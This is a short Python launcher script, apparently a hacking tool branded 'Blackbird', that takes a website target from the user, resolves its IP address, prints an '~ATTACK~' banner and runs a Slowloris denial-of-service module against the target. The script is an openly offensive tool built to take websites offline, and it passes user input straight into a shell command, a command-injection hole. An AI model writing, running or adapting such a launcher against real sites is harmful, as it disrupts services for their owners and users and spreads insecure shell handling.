import sys
import os
import time
import random
import socket
import getpass
os.system("clear")
time.sleep(1)
print (" ")
print( " ")
print( " ")
os.system("clear")
os.system(" figlet -c Blackbird | lolcat")
print ("                                                              by DankShiku")
print(" ")
print (" ")
print (" ")
print( " ")
target = input(" Target (ex: www.example.com) : ")
os.system("clear")
print (" ")
print (" ")
os.system(" figlet -c Blackbird | lolcat")
print ("                                                              by DankShiku")
print(" ")
print(" ")
print (" ")
print(" ")
print ("                           ------------------------------------")
print(f'                          | Target IP address : {socket.gethostbyname(target)} |')
print ("                           ------------------------------------")
print (" ")
print (" ")
print (" ")
print (" ")
print ("                                         ~ATTACK~         ")
print (" ")
os.system("python module/slowloris.py "+target+"")

